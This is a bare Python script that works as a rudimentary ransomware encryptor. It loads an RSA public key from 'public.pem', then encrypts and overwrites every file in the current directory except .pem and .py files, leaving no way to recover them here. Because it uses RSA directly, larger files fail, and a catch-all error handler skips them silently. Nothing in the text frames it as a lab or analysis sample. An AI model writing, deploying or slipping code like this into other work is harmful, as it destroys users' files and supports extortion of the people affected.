import rsa
import os

with open('public.pem', 'rb') as f:
    pub_key = rsa.PublicKey.load_pkcs1(f.read())
    

for fileToEncrypt in os.listdir('.'):
    if fileToEncrypt.endswith('.pem') or fileToEncrypt.endswith('.py'):
        continue
    try:
        with open(fileToEncrypt, 'rb') as f:
            file = f.read()
            # print(file)

        with open(fileToEncrypt, 'wb') as f:
            f.write(rsa.encrypt(file, pub_key))
    except: 
        print("Could not encrypt file: ", fileToEncrypt)
        

